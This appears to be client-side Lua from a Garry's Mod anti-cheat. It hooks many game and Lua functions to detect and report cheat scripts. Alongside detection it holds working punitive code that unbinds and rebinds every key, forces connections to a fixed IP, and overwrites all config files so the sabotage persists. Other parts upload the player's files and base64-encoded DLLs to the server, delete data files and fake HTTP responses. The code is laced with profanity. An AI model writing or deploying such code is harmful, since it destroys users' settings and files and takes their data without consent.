local NotGBL		= _R.ConVar.GetBool
local NotGHP		= _R.ConVar.GetHelpText
local NotGFL		= _R.ConVar.GetFloat
local NotGDF		= _R.ConVar.GetDefault

local Lists			= {
	White_DLC			= {},
	White_NNRIgnore		= {},
	White_NNRWeapons	= {},
	White_Package		= {},
	White_Require		= {},
	White_Modules		= {},
	White_GSafe			= {},
	White_GUseless		= {},
	White_CVTab			= {},
	White_Hooks			= {},
	White_CCA			= {},
	White_GM			= {},
	White_Font			= {},
	White_CCC			= {},
	White_CCV			= {},
	White_PRT			= {},
	
	Black_RCC			= {},
	Black_DataFiles		= {},
	Black_Megaloop		= {},
	Black_Hooks			= {},
	Black_NoHW			= {},
}

local function Merge(tab)
	for k,v in pairs(tab) do
		Lists[k] = v
	end
	tab = nil
end

_G.WLists		= nil
NotINC("lists/cl_w_hac.lua")
Merge(_G.WLists)
_G.WLists		= nil

_G.BLists		= nil
NotINC("lists/cl_b_hac.lua")
Merge(_G.BLists)
_G.BLists		= nil

_G.GList		= nil
NotINC("lists/sh_w_gsafe.lua")
Merge(_G.GList)
_G.GList		= nil

local Cheese,Bacon,Mail = 0,0,{}
for k,v in pairs(_R) do Bacon = Bacon + 1 end

for k,v in pairs(package.loaded) do
	Cheese = Cheese + 1
	NotTIS(Mail, k)
end

local HCCMD			= (hook or concommand)
local TCMD			= (table and table.Copy)
local PLCC			= (package.loaded.concommand)
local PLHK			= (package.loaded.hook)
local PLCV			= (package.loaded.cvars)
local DGMT			= (NotDGMT(_G) != nil)
local GGMT			= (NotGMT(_G) != nil)
local GCICount		= NotGCI()
local CGBCount		= NotCGB("count")

local function FPath(ball)
	local What = type(ball)
	if What != "function" then return What,0,false end
	local DGI = NotDGE(ball)
	if not DGI then return "Gone-"..tostring(ball),0,false end
	
	local Path = NotGS((DGI.short_src or What), "\\","/")
	local Line = (DGI.linedefined or 0)
	
	return Path,Line,true
end
local function StringCheck(str,check)
	return NotSS(str,1,#check) == check
end
local function GIsUseless(glasshammer)
	for k,v in pairs(Lists.White_GUseless) do
		if StringCheck(glasshammer, v) then
			return true
		end
	end
	return false
end

//HOW DID THIS GET HERE, I'M NOT GOOD WITH COMPUTER
local Crap = {}
local function EatKeys(Eat,Keys)
	local function RCC(str)
		local loo,poo = pcall(function()
			Eat(str)
		end)
		if poo and not Crap[poo] then
			Crap[poo] = poo
			NotTS(20, function()
				NotRCC("ohdear", "EatKey("..Keys..") ["..tostring(poo).."]")
			end)
		end
	end
	local function FuckKey(k,v) RCC('bind '..k..' "'..v..'; play hac/eight.wav; alias disconnect kill; say I CHEAT BAN ME FOR"') end
	local function FuckYou(k,v) RCC('bind '..k..' "'..v..'"') end
	
	RCC("unbindall")
	RCC('alias gamemenucommand "say WE CAN DO WONDERFUL THINGS WITH LIGHT BULBS!"')
	RCC('alias cancelselect "say I REALLY SHOULD NOT CHEAT"')
	RCC('alias disconnect "say I WILL NEVER CHEAT AGAIN!"')
	RCC('alias connect "say PIECE OF SHIT!"')
	RCC('alias exit "say I AINT HAVIN IT"')
	RCC('alias exec "say WHERES MY HAMMER"')
	RCC('alias quit "say I SHOULD NEVER HAVE USED HACKS"')
	RCC('alias toggleconsole "say I AINT HAVIN IT!"')
	RCC('alias _restart say HOW CAN IT TAKE THAT MUCH!"')

	FuckYou("y",			"messagemode")
	FuckYou("u",			"messagemode")
	FuckYou("x",			"+voicerecord")

	FuckYou("`", 			"play hac/still_not_working.mp3; gamemenucommand quitnoconfirm; say I POPPED IT!")
	FuckYou("F10", 			"play hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say AND IT AINT EVEN GONNA COMPLAIN!")
	FuckYou("MOUSE1",		"+attack2; sensitivity 90; volume 0.1; say IVE LOST MY MARBLES!")
	FuckYou("MOUSE2",		"+attack; sensitivity 0.1; volume 1; play hac/highway_to_hell.mp3; say IM ON A HIGHWAY TO HELL")
	FuckYou("MOUSE3",		"kill; sensitivity 90; volume 0.1; say BURST ME BAGPIPES!")

	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("e", 			"+reload; volume 0.1")
	FuckKey("r", 			"+jump; volume 0.1")
	FuckKey("f", 			"noclip; connect 94.23.153.42")
	FuckKey("q", 			"connect 94.23.153.42")
	FuckKey("c", 			"connect 94.23.153.42")
	FuckKey("v", 			"impulse 100; kill")
	FuckKey("TAB", 			"+use; connect 94.23.153.42")
	FuckKey("SPACE",		"+menu; exec skill.cfg")
	FuckKey("CTRL",			"kill; exec skill_manifest.cfg")
	FuckKey("SHIFT",		"+walk; exec skill.cfg")
	FuckKey("ALT",			"+speed; exec skill_manifest.cfg")
	FuckKey("MWHEELUP",		"invnext; exec skill.cfg")
	FuckKey("MWHEELDOWN",	"invprev; exec skill_manifest.cfg")
	FuckKey("F4", 			"connect 94.23.153.42")
	FuckKey("F3", 			"connect 94.23.153.42")
	FuckKey("F2", 			"connect 94.23.153.42")
	FuckKey("F1", 			"connect 94.23.153.42")
	
	RCC("volume 0.4")
	RCC("cl_downloadfilter mapsonly")
	
	NotTS(2, function()
		RCC("host_writeconfig")
		for k,v in _H.pairs( _H.NotFF("cfg/*.cfg", "MOD") ) do
			RCC("host_writeconfig cfg/"..v)
		end
		RCC('alias host_writeconfig "gm_giveswep bargin_bazooka"')
		
		RCC('alias unbind say I REALLY DO WANNA TO THROW THIS LIGHTBULB AT THE WALL!"')
		RCC('alias unbindall echo OH DEAR!"')
		RCC('alias bind echo I POPPED IT!"')
	end)
end
local function IsRCC(s)
	s = NotSL(s)
	return NotFL(s,"com") or NotFL(s,"run") or NotFL(s,"exe") or NotFL(s,"cmd") or NotFL(s,"rcc") or NotFL(s,"con")
end
local Gun	= {}
local Dogs	= {}
local Hose 	= 0
for k,v in pairs(_G) do --From Garry with love
	Hose = Hose + 1
	local idx	= tostring(k)
	local vdx	= tostring(v)
	local KType = type(k)
	local VType = type(v)
	
	if KType == "string" then
		if VType == "table" then
			if _G[idx] != nil then
				for x,y in pairs( _G[idx] ) do
					Gun[k] = Gun[k] or {}; Gun[k][x] = y
					local SubX	= tostring(x)
					local SubY	= tostring(y)
					local YType = type(y)
					
					local Ret = "_G."..idx.."."..SubX
					
					if not GIsUseless(Ret) then
						if YType == "function" then
							local Path,Line = FPath(y)
							Ret = Ret..Format("(FUNCTION) [%s:%s]", Path,Line)
							
						elseif YType == "table" then
							Ret = Ret.." (TABLE)"
							
						else
							Ret = Ret..Format("=[[%s]] (%s)", SubY, YType:upper() )
						end
						
						if not Lists.White_GSafe[ Ret ] then
							NotTIS(Dogs, Ret)
							
							if not Silent then
								if IsRCC(SubX) then
									EatKeys(_G[k][x], Ret)
								end
								
								_G[k][x] = ErrorNoHalt
							end
						end
					end
				end
			end
			
		elseif VType != "table" then
			Gun[k] = v
			local Path,Line = FPath(v)
			local Ret = Format("_G.%s (FUNCTION) [%s:%s]", idx, Path,Line)
			
			if VType != "function" then
				Ret = Format("_G.%s=[[%s]] (%s)", idx,vdx, VType:upper() )
			end
			
			if not GIsUseless(Ret) and not Lists.White_GSafe[ Ret ] then
				NotTIS(Dogs, Ret)
				
				if VType == "function" and not Silent then
					if IsRCC(idx) then
						EatKeys(_G[k], Ret)
					end
					_G[k] = ErrorNoHalt
				end
			end
		end
	end
end


NotINC("inclUdes/mOdulEs/UsermeSsage.lua")
local hookAdd			= usermessage.Hook

_G.concommand			= {}
NotINC("iNcluDes/moDules/ConCommANd.lua")
local NotECC			= InjectConsoleCommand
local NotCCA			= concommand.Add
local NotCCR			= concommand.Run
local NotCGT 			= concommand.GetTable()

_G.hook					= {}
_G.IsValid 				= function(v)
	if !v or !v.IsValid then return false end
	return v:IsValid()
end
NotINC("INCludes/modULES/HoOK.lua")
local NotHA				= hook.Add
local NotHR				= hook.Remove
local NotHC				= hook.Call
local NotHH				= hook.Hooks

NotINC("inCLuDeS/ModuLEs/CvaRs.lua")
local NotCAC			= cvars.AddChangeCallback

_G.net.Receive			= nil
_G.net.Incoming			= nil
NotINC("iNcludES/moDULeS/nEt.lua")

local NotTE				= function(e,u) for k,v in pairs(e) do e[k] = (u or nil) end if not u then e = {} end end
local MyPath,MyLine		= "Gone", 0
local HACKey			= "CLG"

local NoBurst = false
_G.hacburst = nil
NotINC("HAC/sh_HACBurst.lua")

local HookCall 	= 0
local HookAdd	= 0
if not (_G.hacburst and _G.hacburst.Send and _G.hacburst.Hook) then
	NoBurst = true
else
	HookCall = _G.hacburst.Send
	HookAdd	 = _G.hacburst.Hook
end

hookAdd("PlayerInitialSpawn", function(ply)
	HACInstalled	= HACInstalled + 1
	MSGHook 		= NotRS(ply)
end)

local AllRand = {}
local function RandomChars()
	local len = NotMR(7,15)
	local rnd = ""
	
	for i = 1, len do
		local c = NotMR(68, 112)
		if c >= 91 and c <= 96 then c = c + 6 end
		rnd = rnd..NotCHR(c)
	end
	
	AllRand[rnd] = true
	return rnd
end
local function NotGMG(...)
	local Meow = {
		cmd  = MSGHook,
		args = {...},
	}
	HookCall("ConCon", NotJST(Meow), nil,nil,nil,true)
end
_G.NotGMG		= NotGMG
_G.GlobalPoop	= NotGMG

local function RunConsoleCommand(cmd,...)
	local Woof = {
		cmd  = cmd,
		args = {...},
	}
	HookCall("ConCon", NotJST(Woof), nil,nil,nil,true)
end
_G.ConCon = RunConsoleCommand

local Kettle = {}
local function DelayGMG(coffee, ...)
	if Kettle[coffee] then return end
	Kettle[coffee] = true
	
	NotGMG(coffee, ...)
end
_G.DelayGMG = DelayGMG
_G.ply 		= DelayGMG

NotCCV("sv_rphysicstime", 0, 16384)

local function CleanThe(toilet)
	local str = NotGGM()
	
	local function ShitDown(paper,bleach)
		bleach = bleach	or {}
		
		for k,v in pairs(paper) do
			local typ = type(v)
			
			if typ == "table" and not bleach[v] then
				bleach[v] = true
				str = str..tostring(k)
				
				ShitDown(v,bleach)
			elseif typ == "string" then
				str = str..tostring(v)
			end
		end
	end
	ShitDown(toilet)
	
	str = str..#str..#str * 2
	return NotCRC(str)
end
HACKey = CleanThe(Lists)


local Lamp = 1
local LPT  = ""
while true do
	local Tab = NotDGE(Lamp)
	if not Tab then break end
	
	LPT = LPT..Format("%s %s %s %s %s\n", Lamp, Tab.what, Tab.name, Tab.short_src, Tab.currentline)
	Lamp = Lamp + 1
end
if Lamp != 4 then
	NotTE(_G, ErrorNoHalt, "Error with Lamp!")
end
local function ValidString(v)
	return (type(v) == "string" and v != "")
end
local function NotIV(what)
	return what and what.IsValid and NotRIV(what)
end
local function Safe(cat,mouse)
	if not cat then return end
	cat = tostring(cat)
	cat = cat:Trim()
	cat = NotGS(cat,"[:/\\\"*%@?<>'#]", "_")
	cat = NotGS(cat,"[]([)]", "")
	cat = NotGS(cat,"[\n\r]", "")
	cat = NotGS(cat,"\7", "BEL")
	return cat:Left(mouse or 25):Trim()
end
local function MyCall(sax,tuba)
	local Horn = NotDGE(sax or 3)
	if not Horn then return "Gone",0 end
	
	local Path = NotGS((Horn.short_src or "Gone"), "\\","/")
	local Line = 0
	if tuba then
		Line = Horn.currentline or 0
	else
		Line = Horn.linedefined or 0
	end
	
	return Path,Line
end
local function Size(cock,inches)
	local Len = NotFXE(cock,inches)
	if not Len or Len == -1 then
		return 0
	else
		return Len
	end
end
local F_Size = _R.File.Size; local F_Close = _R.File.Close; local F_Read = _R.File.Read; local F_Write = _R.File.Write
local function Read(name,shelf,paper)
	local Book = NotFO(name, (paper or "r"), shelf)
		if not Book then return end
		local str = F_Read(Book, F_Size(Book) )
	F_Close(Book)
	
	return str
end
local function Panties()
	local lol = NotGGM()
	local map = #lol * 2
	return map..lol:Left(5):upper()..map * map
end
asdf = DelayGMG
Panties = Panties

local function OverrideCmd(ply,cmd,args,str)
	if #args >= 1 then
		DelayGMG("Key="..cmd..":Args=[["..Safe(str).."]]")
	else
		DelayGMG("Key="..cmd)
	end
	
	if NotIV( LocalPlayer() ) then
		NotCPT(LocalPlayer(), "Unknown Command: '"..cmd.."'\n")
	end
end

if _G.BootyBucket then NotTS(160, function() DelayGMG("BootyBucket") NotTE(_R) end) end
_G.BootyBucket = nil
NotINC("en_streamhks.lua")
if not _G.BootyBucket then NotTS(160, function() DelayGMG("noBootyBucket") NotTE(_R) end) end
local NotBucket = _G.BootyBucket

local Money = {}
local function NSI(tray,cake,dough,milk)
	local path,line = MyCall(4)
	local str = Format("NotSoUseless=%s [%s:%s]", tray, path,line)
	
	if cake and ValidString(dough) and not Money[dough] then
		Money[dough] = true
		NotBucket(dough,milk)
	end
	
	DelayGMG(str)
end
CompileString	= function(s,f)	NSI("CompileString",1, s,"CS") 		return NotHP(s,f)									end
RunString		= function(s)	NSI("RunString", 	1, s,"RS")		NotTS(1, function() return s and NotST(s) 	end)	end
RunStringEx		= function(s,w)	NSI("RunStringEx", 	1, s,"RSX")		NotTS(1, function() return s and NotSX(s,w) end)	end
CompileFile		= function(f)	NSI("CompileFile", 	1, (Read("lua/"..f, "GAME") or "err"),"CF") 						end
Compilestring	= function(s,f)	NSI("Compilestring",1, s,"Cs")															end
Compilefile		= function(f)	NSI("Compilefile",	1, (Read("lua/"..f, "GAME") or "err"),"Cf")							end
WFC111255 		= function()	NSI("WFC111255")																		end
Runstring		= function(s)	NSI("Runstring", 	1, s,"Rs")															end
LoadString		= function(s)	NSI("LoadString",	1, s,"LS")															end
loadstring		= function(s)	NSI("loadstring",	1, s,"Ls")															end
setfenv			= function()	NSI("setfenv")																			end
getfenv			= function()	NSI("getfenv")																			end

local Pudding = {}
local function EatThis(k)
	if k and not Pudding[k] then
		local v = Read(k, "GAME")
		if v then
			NotBucket("\n--"..k..":\n\n"..v, k.."_EAT.lua")
			DelayGMG("EatThis="..k..(v and "" or ", NoV") )
		end
		Pudding[k] = 1
	end
end

local function GoodHook(what,k,where)
	if AllRand[k] or (what == "InitPostEntity" and k == "Hooks") then return true end
	if (what == "OnViewModelChanged" and where == "gamemodes/base/entities/entities/gmod_hands.lua:50") then return true end
	
	for i,Tab in pairs(Lists.White_Hooks) do
		if Tab[1] == what and Tab[2] == k and Tab[3] == where then
			return true
		end
	end
	
	return false
end

local function GoodCCA(cmd,where)
	for i,Tab in pairs(Lists.White_CCA) do
		if Tab[1] == cmd and Tab[2] == where then
			return true
		end
	end
	
	return false
end

local function GoodGM(what,where)
	for i,Tab in pairs(Lists.White_GM) do
		if Tab[1] == what and Tab[2] == where then
			return true
		end
	end
	
	return false
end

local function GoodFont(new,where)
	for i,Tab in pairs(Lists.White_Font) do
		if Tab[1] == new and Tab[2] == where then
			return true
		end
	end
	
	return false
end


local function UselessTable_Hook()
	local path,line = MyCall(nil,true)
	
	DelayGMG( Format("hookGetTable [%s:%s]", path,line) )
	return {},{}
end
_G.hook.GetTable = UselessTable_Hook

local function UselessTable_Cmd()
	local path,line = MyCall(nil,true)
	
	DelayGMG( Format("concommandGetTable [%s:%s]", path,line) )
	return {},{}
end
_G.concommand.GetTable = UselessTable_Cmd



local function CreateFont(new,Tab)
	local path,line = MyCall(nil,true)
	local where = path..":"..line
	
	if not GoodFont(new,where) then
		NotGMG("CreateFont=", Safe(new),where)
		EatThis(path)
		
		if not Silent then
			Tab.font	= "comic sans ms"
			Tab.size 	= 150 --math.random(0,1) == 1 and 80 or 1
			Tab.weight	= 400
			Tab.anti	= true
			Tab.add		= false
		end
	end
	
	return NotSCF(new,Tab)
end
_G.surface.CreateFont = CreateFont


local function NewConCommand(ent,cmd,stuff)
	local low = NotSL( tostring(cmd) )
	
	if Lists.Black_RCC[low] then
		local path,line = MyCall()
		DelayGMG( Format("PCC=%s [%s:%s]", cmd, path,line) ); EatThis(path)
		
		if not Silent then return false end
	end
	
	if not NotIV(ent) then return end
	return NotPCC(ent,cmd,stuff)
end
_R.Entity.ConCommand 	= NewConCommand
_R.Player.ConCommand	= NewConCommand


local function NewRCC(...)
	local Args	= {...}
	local low	= NotSL( tostring( Args[1] ) )
	
	if Lists.Black_RCC[low] then
		local path,line = MyCall()
		DelayGMG( Format("RCC=%s,%s [%s:%s]", low, (Args[2] or "nil"), path,line) ); EatThis(path)
		
		if not Silent then return false end
	end
	
	NotRCC(...)
end
_G.RunConsoleCommand = NewRCC


local function TableCopy(tab,lookup_table)
	if not tab then return nil end
	
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("tableCopy=_G [%s:%s]", path,line) )
		elseif tab == _R then
			DelayGMG( Format("tableCopy=_R [%s:%s]", path,line) )
		elseif tab == file then
			DelayGMG( Format("tableCopy=file [%s:%s]", path,line) )
		elseif tab == hook then
			DelayGMG( Format("tableCopy=hook [%s:%s]", path,line) )
		elseif tab == debug then
			DelayGMG( Format("tableCopy=debug [%s:%s]", path,line) )
		elseif tab == net then
			DelayGMG( Format("tableCopy=net [%s:%s]", path,line) )
		end
		return tab
	end
	
	local copy = {}
	NotSMT(copy, NotGMT(tab) )
	
	for i,v in pairs(tab) do
		if not istable(v) then
			copy[i] = v
		else
			lookup_table = lookup_table or {}
			lookup_table[tab] = copy
			
			if lookup_table[v] then
				copy[i] = lookup_table[v]
			else
				copy[i] = TableCopy(v,lookup_table)
			end
		end
	end
	
	return copy
end
if not _G.table then _G.table = {} end
_G.table.Copy = TableCopy


local function NewSMT(tab,meta)
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("setmetatable(_G) [%s:%s]", path,line) )
		elseif tab == _R then
			DelayGMG( Format("setmetatable(_R) [%s:%s]", path,line) )
		elseif tab == file then
			DelayGMG( Format("setmetatable(file) [%s:%s]", path,line) )
		elseif tab == hook then
			DelayGMG( Format("setmetatable(hook) [%s:%s]", path,line) )
		elseif tab == debug then
			DelayGMG( Format("setmetatable(debug) [%s:%s]", path,line) )
		elseif tab == net then
			DelayGMG( Format("setmetatable(net) [%s:%s]", path,line) )
		end
		if not Silent then NotTE(meta, ErrorNoHalt, "Can't setmetatable!") end
		return {}
	end
	return NotSMT(tab,meta)
end
_G.setmetatable = NewSMT


local function NewRST(tab,k,v)
	if tab == _G or tab == _R or tab == file or tab == hook or tab == debug or tab == net then
		k = tostring(k)
		local path,line = MyCall()
		EatThis(path)
		if tab == _G then
			DelayGMG( Format("rawset(_G,%s) [%s:%s]", k, path,line) )
		elseif tab == _R then
			DelayGMG( Format("rawset(_R,%s) [%s:%s]", k, path,line) )
		elseif tab == file then
			DelayGMG( Format("rawset(file,%s) [%s:%s]", k, path,line) )
		elseif tab == hook then
			DelayGMG( Format("rawset(hook,%s) [%s:%s]", k, path,line) )
		elseif tab == debug then
			DelayGMG( Format("rawset(debug,%s) [%s:%s]", k, path,line) )
		elseif tab == net then
			DelayGMG( Format("rawset(net,%s) [%s:%s]", k, path,line) )
		end
		if not Silent then NotTE(tab) end
		return {}
	end
	return NotRST(tab,k,v)
end
_G.rawset = NewRST
_G.entity = DelayGMG

local Butthole = {}
local function NewRQ(mod)
	local path,line = MyCall(nil,true)
	mod = tostring(mod)
	
	local Cork = Format("require(%s) [%s:%s]", mod, path,line)
	if not Lists.White_Require[Cork] then
		DelayGMG(Cork)
		EatThis(path)
	end
	
	if Butthole[Cork] then return end
	Butthole[Cork] = true
	
	local Low = NotSL(mod)
	if Low == "hook" or Low == "net" or Low == "concommand"or Low == "usermessage" then return end
	
	return NotRQ(mod)
end
_G.require	= NewRQ
_G.NotRQ 	= NotRQ

local function NewCCC(name,def,save,user)
	local path,line = MyCall(nil,true)
	local where = Format("[%s:%s]", path,line)
	
	if where == "[gamemodes/sandbox/entities/weapons/gmod_tool/stool.lua:41]" or
		where == "[addons/spp/lua/spropprotection/cl_init.lua:122]" then
		return NotCCC(name,def,save,user)
	end
	def		= tostring(def)
	name 	= tostring(name)
	where	= Format("CreateClientConVar(%s,%s,%s,%s) %s", name,def,tostring(save),tostring(user), where)
	
	if not Lists.White_CCC[where] then
		DelayGMG(where)
		EatThis(path)
		
		NotCAC(name, function(var,old,new)
			if new != def then DelayGMG("NewCCC="..var..":Args=("..Safe(old.." - "..new)..")") end
		end)
		
		if NotFL(NotSL(name),"spam") or NotFL(NotSL(path),"spam") then
			return NotCCV("_~"..name,0,16384,"Spam spam spam beans eggs spam spam")
		end
		if not Silent then
			return NotCCV(name,def,16384,"Cheat command")
		end
	end
	
	return NotCCC(name,def,save,user)
end
_G.CreateClientConVar 	= NewCCC
_G.NotSX				= NotSX

local function NewCCV(name,def,flags,help)
	if name == "cl_playerbodygroups" or name == "cl_playerskin" then
		return NotCCV(name,def,flags,help)
	end
	
	local FLG = "nil"
	if flags then
		FLG = ""
		
		if type(flags) == "table" then
			for k,v in pairs(flags) do
				FLG = tostring(v)..","
			end
		else
			FLG = tostring(flags)
		end
	end
	
	local path,line = MyCall(nil,true)
	name = tostring(name)
	local where = Format("CreateConVar(%s,%s,%s,%s) [%s:%s]", name,tostring(def),FLG,tostring(help), path,line)
	
	if not Lists.White_CCV[where] then
		DelayGMG(where)
		EatThis(path)
		
		NotCAC(name, function(var,old,new)
			DelayGMG("NotCCV="..var..":Args=("..Safe(old.." - "..new)..")")
		end)
		
		if NotFL(NotSL(name),"spam") or NotFL(NotSL(path),"spam") then
			return NotCCV("_~"..name,0,16384,"Spam spam spam beans eggs spam spam")
		end
		if not Silent then
			return NotCCV(name,def,16384,help)
		end
	end
	
	return NotCCV(name,def,flags,help)
end
_G.CreateConVar = NewCCV

local function ChatPrint(self,str)
	if ValidString(str) and NotFL(str,"Unknown Command: '") then
		DelayGMG("UNK="..Safe( str:match("'(.-)'") ))
	end
	
	return NotCPT(self,str)
end
_R.Player.ChatPrint	= ChatPrint
_R.Entity.ChatPrint	= ChatPrint

local angle_zero = Angle(0,0,0)
local function SetViewAngles(view,ang)
	local path,line = MyCall()
	if not (path and ang) then return end
	
	DelayGMG( Format("SetViewAngles=[%s:%s]", path,line) )
	
	return not (ang.p < -91 or ang.p > 91) and NotSVA(view,ang) or angle_zero
end
_R.CUserCmd.SetViewAngles = SetViewAngles

local function SetEyeAngles(self,ang)
	if not NotIV(self) then return end
	
	local path,line = MyCall()
	if not (path and ang) then return end
	
	DelayGMG( Format("SetEyeAngles=[%s:%s]", path,line) )
	
	return not (ang.p < -91 or ang.p > 91) and NotSEA(self,ang) or angle_zero
end
_R.Player.SetEyeAngles	= SetEyeAngles
_R.Player.SnapEyeAngles	= SetEyeAngles
_R.Entity.SetEyeAngles	= SetEyeAngles
_R.Entity.SnapEyeAngles	= SetEyeAngles

local function AddGroups()
	KARMA 				= true
	ROLE_TRAITOR		= 1337
	TEAM_SPECTATOR		= 9
	MOVETYPE_OBSERVER	= 2
	vgui.register		= error
	plugins 			= hook
	command 			= concommand
	import				= Error
	_ENV				= _G
	c 					= "cock"
	local function Group() return string.rep("Admin ", 4) end
	local Tab = {ROLE_TRAITOR}
	
	_R.Player.GetUserGroup	= Group
	_R.Player.GetRole		= function() local p,l = MyCall() DelayGMG( Format("GetRole [%s:%s]", p,l) ) return 1 end
	_R.Player.IsDormant		= function() local p,l = MyCall() DelayGMG( Format("pIsDormant [%s:%s]", p,l) ) return true end
	_R.Entity.IsDormant		= function() local p,l = MyCall() DelayGMG( Format("eIsDormant [%s:%s]", p,l) ) return true end
	_R.Entity.CanBuy 		= Tab
	_R.Entity.GetUserGroup	= Group
	_R.Weapon.GetUserGroup	= Group
	_R.Weapon.CanBuy 		= Tab
	_R.Weapon.isReloading	= true
	_R.Weapon.reloading		= true
	_R.Weapon.Spread		= 1337
	_R.Weapon.Cone			= 1337
end

local Chicken = nil
NotTC(RandomChars(), 6, 0, function()
	local ply = LocalPlayer()
	if ply and NotIV(ply) then
		if ply.voice_battery then ply.voice_battery = nil DelayGMG("ply.voice_battery") end
		local Wep = ply:GetActiveWeapon()
		
		if Wep and NotIV(Wep) then
			local KWC = NotSL( Wep:GetClass() )
			
			if not Lists.White_NNRIgnore[KWC] and (Wep.Primary) then
				local RCL = tonumber(Wep.Primary.Recoil) or 1
				
				if Lists.White_NNRWeapons[KWC] != RCL then
					DelayGMG( Format("NoRecoil=%s-%s", KWC, RCL) )
				end
			end
		end
		
		local SID = ply:SteamID()
		if not Chicken then
			Chicken = SID
		end
		
		if Chicken != SID then
			DelayGMG("SteamID="..SID)
			Chicken = SID
		end
	end
	AddGroups()
end)

for k,v in pairs(Lists.Black_NoHW) do
	NotCAC(v, function(var,old,new)
		DelayGMG("NoHW="..var..":Args=[["..Safe(new).."]]")
	end)
end


local SAFE,BAD = 1,2
local function CMECheck(This,v,butt)
	local Out = NotFO(This, "rb", "MOD")
	
	if not Out then
		DelayGMG("CME=NoOut="..This)
		return
	end
	
	local Size 	= F_Size(Out)
	if Size > 700000 then
		DelayGMG("CME=TooBig="..This.."-"..Size)
		F_Close(Out)
		Out = nil
		return
	end
	
	local Cont	= NotB64( F_Read(Out,Size) )
	if not Cont then DelayGMG("CME=NoCont("..This.."-"..Size..")") return end
	
	local CRC 	= NotCRC(Cont)
	local uID	= Format("%s-%s", v, CRC)
	local Res 	= Lists.White_DLC[ uID ]
	
	if Res or Lists.White_DLC[CRC] then
		if Res and Res != SAFE then
			DelayGMG( Format("CME=%s-%s", This, CRC) )
		end
	else
		local CME = NotJST(
			{
				Bin 	= Cont,
				Name	= v,
				CRC		= CRC,
			}
		)
		Cont = nil
		HookCall(butt, CME, nil, uID)
		CME	 = nil
	end
	
	F_Close(Out)
	Out = nil
end

local function CModCheck(nuts,what,tire,cone,nail)
	for k,v in pairs( NotFF(nuts..what, "MOD") ) do
		if not ValidString(v) or ((nuts == "bin/" or nuts == "lua/") and Lists.White_DLC[v]) then continue end
		if (nuts == "lua/" or nuts == "lua/includes/modules/") and NotSS(v,-4) == ".lua" then continue end
		local This = nuts..v
		RunConsoleCommand(cone, tire..v, Size(This, "MOD"), v)
		if nail then CMECheck(This,v,cone) end
	end
end

NotTS(9, function()
	if concommand then	DelayGMG("PLCount", Cheese) end
	if HCCMD	then 	DelayGMG("HCCMD")	end
	if TCMD		then 	DelayGMG("TCMD")	end
	if DGMT 	then 	DelayGMG("DGMT")	end
	if GGMT 	then 	DelayGMG("GGMT")	end
	
	for k,v in pairs(Dogs) do
		DelayGMG("GCheck="..v)
	end
	
	if MyPath != "Gone" or MyLine != 0 then
		DelayGMG( Format("BHAC=[%s:%s]", MyPath, MyLine) )
	end
	
	if PLCC then
		PLCC = false
		DelayGMG("KR30=PLCC")
	end
	if PLCV then
		PLCV = false
		DelayGMG("KR30=PLCV")
	end
	if PLHK then
		PLHK = false
		DelayGMG("KR30=PLHK")
	end
	
	if NoBurst then
		NoBurst = false
		DelayGMG("KR30=NoBurst")
	end
	AddGroups()
end)
CModCheck("lua/includes/enum/",		"*",		"ENMod=",	"gm_explode_player")
CModCheck("lua/menu_plugins/",		"*",		"MLMod=",	"gm_respawn_player")
CModCheck("addons/",				"*.vdf",	"VMod=",	"gm_kill_player")
CModCheck("addons/",				"*.dll",	"VMod=",	"gm_kill_player",  true)
CModCheck("bin/",					"*",		"BMod=",	"gm_kill_player",  true)
CModCheck("lua/includes/modules/",	"*",		"CMod=",	"gm_spawn_player", true)
CModCheck("lua/bin/",				"*",		"CMod=",	"gm_spawn_player", true)
CModCheck("lua/",					"*",		"CMod=",	"gm_spawn_player", true)


local NotHTTP,E482 = HTTP,"\nNetwork error 482. Somebody shot the server with a 12 Gauge, please contact your administrator\n"
function _G.HTTP(tab)
	local path,line = MyCall(4)
	DelayGMG( Format("HTTP=[[%s]] M=%s [%s:%s]", tab.url, tab.method, path,line) ); EatThis(path)
	if tab.parameters then
		DelayGMG( Format("HTTP=[[%s]] Params[[%s]] [%s:%s]", tab.url, table.ToString(tab.parameters), path,line) )
	end
	
	tab.successOld = tab.success
	function tab.success(code, body, headers)
		DelayGMG( Format("HTTPsuccess c[[%s]] b[[%s]] h[[%s]] [%s:%s]", code,body, table.ToString(headers or {}), path,line) )
		
		pcall(tab.successOld,482,E482,headers)
		if tab.failed then pcall(tab.failed,E482) end
		pcall(tab.successOld,code,body,headers)
	end
	NotHTTP(tab)
end

NotTS(26, function()	
	for k,v in pairs(Lists.Black_DataFiles) do
		local What 	= (v.What  or "*.txt")
		local Where = (v.Where or "")
		local File	= Where..What
		
		if ValidString(File) then
			for x,y in pairs( NotFF(File, "DATA") ) do
				if ValidString(y) then
					local NewFile	= Where..y
					local Cont		= Read(NewFile, "DATA")
					local FCont		= Safe(Cont, 25)
					local FSize		= Size(NewFile, "DATA")
					NotTS(60, function() NotFD(NewFile) end)
					
					if FSize then
						if ValidString(Cont) then
							DelayGMG( Format("Datafile=data/%s-%s (%s) [[%s]]", NewFile, FSize, What, FCont) )
							--NotBucket(Cont:Left(700000), NewFile)
						else
							DelayGMG( Format("Datafile=data/%s-%s (%s)", NewFile, FSize, What) )
						end
					else
						if ValidString(Cont) then
							DelayGMG( Format("Datafile=data/%s (%s) [[%s]]", NewFile, What, FCont) )
							--NotBucket(Cont:Left(700000), NewFile)
						else
							DelayGMG( Format("Datafile=data/%s (%s)", NewFile, What) )
						end
					end
				end
			end
		end
	end
end)

local function Ooh()
	for k,v in pairs(Lists.Black_Megaloop) do
		for x,y in pairs(v.H) do
			local what = _G[y]
			
			if what != nil and what != Useless then
				local path,line = FPath(what)
				local This = (type(what) != "function" and ": "..tostring(what) or "")
				DelayGMG( Format("TC=%s-_G.%s [%s:%s]%s", v.D,y, path,line, This) ); EatThis(path)
				_G[y] = Useless
			end
		end
	end
	
